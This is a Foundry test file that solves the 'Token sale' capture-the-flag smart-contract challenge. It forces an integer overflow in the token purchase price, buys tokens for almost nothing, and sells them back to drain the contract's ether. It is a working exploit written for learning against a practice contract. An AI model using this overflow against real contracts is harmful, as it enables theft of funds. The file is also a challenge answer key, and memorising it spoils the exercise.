// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/1-Token-sale.sol";

contract Challenge1Test is Test {
    TokenSaleChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new TokenSaleChallenge{value: 1 ether}();
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 10 ether);
    }

    function testExample() public {
        vm.startPrank(address(player));

        uint256 numTokens = type(uint256).max / 1e18 + 1;
        target.buy{value: numTokens * 1e18}(numTokens);
        uint256 balance = address(target).balance;
        emit log_named_uint("balance contrato", address(target).balance);

        target.sell(balance / 1 ether);   
        emit log_named_uint("balance contrato", address(target).balance);

        
        assertTrue(target.isComplete());
    }
}
